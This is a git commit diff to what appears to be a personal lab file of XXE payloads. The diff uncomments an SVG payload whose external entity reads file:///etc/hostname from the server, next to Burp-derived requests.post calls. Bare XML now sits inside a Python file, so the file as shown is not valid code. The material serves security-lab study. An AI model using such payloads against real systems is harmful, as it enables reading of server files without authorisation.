63b92f69688b86b2218a167e8d8513ccfc90d7dd
n1njaZ0Z <amotz@duck.com>
2022-10-24 18:13:51 -0400

    xxe

--- XXE/Lab_ XXE payloads.py
+++ XXE/Lab_ XXE payloads.py
@@ -50,11 +50,11 @@ requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp
 # SVG
 
 
-# <?xml version="1.0" standalone="yes"?>
-# <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
-# <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
-# <text font-size="16" x="0" y="16">&xxe;</text>
-# </svg>
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+<text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
 
 
 import requests
